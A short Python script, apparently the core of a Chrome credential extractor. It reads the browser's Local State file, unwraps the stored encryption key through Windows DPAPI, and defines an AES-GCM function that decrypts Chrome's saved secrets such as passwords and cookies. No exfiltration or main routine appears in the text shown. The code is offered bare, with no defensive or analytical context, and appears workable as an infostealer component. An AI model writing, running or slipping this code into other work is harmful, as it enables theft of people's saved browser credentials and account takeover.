import base64
import json
import os
from datetime import datetime, timedelta
import win32crypt
from Crypto.Cipher import AES
import shutil
import sqlite3


def getChromeDateTime(ChromDate):
    if ChromDate != 86400000000 and ChromDate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=ChromDate)
        except Exception as e:
            print(e)
            return ChromDate
    else:
        return " "


def getEncyptionKey():
    LocalStatePath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data",
                                  "Local State")
    with open(LocalStatePath, "r", encoding="utf-8") as f:
        LocalState = f.read()
        LocalState = json.loads(LocalState)

    Key = base64.b64decode(LocalState["os_crypt"]["encrypted_key"])

    Key = Key[5:]
    return win32crypt.CryptUnprotectData(Key, None, None, None, 0)[1]


def decryptData(Data, Key):
    try:
        fileIv = Data[3:15]
        Data = Data[15:]

        chiperObj = AES.new(Key, AES.MODE_GCM, fileIv)

        return chiperObj.decrypt(Data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(Data, None, None, None, 0)[1])
        except:
            return " "







